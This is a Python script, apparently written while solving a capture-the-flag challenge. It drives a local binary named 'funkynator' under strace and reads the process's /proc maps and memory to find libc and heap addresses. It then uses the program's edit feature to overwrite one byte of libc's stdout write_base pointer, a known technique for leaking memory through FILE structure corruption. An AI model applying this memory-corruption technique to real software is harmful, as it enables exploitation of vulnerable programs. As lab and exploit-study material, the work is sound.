#!/usr/bin/env python3
"""Use strace on the binary and watch the write calls."""
import subprocess, os, struct, time, signal
from pathlib import Path

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
env = os.environ.copy()
env['LD_LIBRARY_PATH'] = str(CHALLENGE_DIR.resolve() / 'glibc')

proc = subprocess.Popen(
    ['strace', '-e', 'write', '-f', '-o', '/tmp/strace_io.out', BINARY],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    cwd=str(CHALLENGE_DIR), env=env
)

def send(s):
    proc.stdin.write(s if isinstance(s, bytes) else s.encode())
    proc.stdin.flush()

def recv_until(marker, timeout=5):
    d = b''
    start = time.time()
    while time.time() - start < timeout:
        fd = proc.stdout.fileno()
        r = os.read(fd, 65536)
        if not r: break
        d += r
        if marker in d: return d
    return d

r = recv_until(b'name?')
send(b'TEST\n')
r = recv_until(b'> ')

send(b'2\n'); recv_until(b'length\n')
send(b'5\n'); recv_until(b'message:\n')
send(b'AAAAA\n'); recv_until(b'?\n')
send(b'n\n'); recv_until(b'?\n')
send(b'y\n'); recv_until(b'> ')

send(b'2\n'); recv_until(b'length\n')
send(b'10\n'); recv_until(b'message:\n')
send(b'BBBBBBBBBB\n'); recv_until(b'?\n')
send(b'n\n'); recv_until(b'?\n')
send(b'y\n'); recv_until(b'> ')

maps = open(f'/proc/{proc.pid}/maps').read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{proc.pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{proc.pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
off = ((libc_base + STDOUT + WB_OFF + 1) - msg2) & 0xFFFFFFFFFFFFFFFF

print(f"libc={libc_base:#x} msg2={msg2:#x} off={off:#x}")
print(f"orig_wb={orig_wb:#x} byte1: {orig_byte1:#04x}->{new_byte1:#04x}")

# Enter editor
send(b'5\n'); recv_until(b'id\n')
send(b'2\n'); recv_until(b'> ')
print("In editor")

# Overwrite
send(b'3\n'); recv_until(b'offset\n')
send(f'{off}\n'.encode()); recv_until(b'value?\n')
send(bytes([new_byte1]) + b'\n')

# Wait, then try to read
import time
time.sleep(2)

# Try reading without blocking
import fcntl
fl = fcntl.fcntl(proc.stdout, fcntl.F_GETFL)
fcntl.fcntl(proc.stdout, fcntl.F_SETFL, fl | os.O_NONBLOCK)
time.sleep(0.5)
try:
    data = os.read(proc.stdout.fileno(), 65536)
    print(f"Got {len(data)} bytes: {data[:80].hex() if data else 'empty'}")
except BlockingIOError:
    print("No data available (program hung?)")
fcntl.fcntl(proc.stdout, fcntl.F_SETFL, fl)

# Check if process is alive
ret = proc.poll()
print(f"Process status: {ret}")

# Check strace
print("\n=== Strace write calls ===")
s = open('/tmp/strace_io.out').read().strip()
for l in s.split('\n')[-10:]:
    print(l)

proc.terminate()
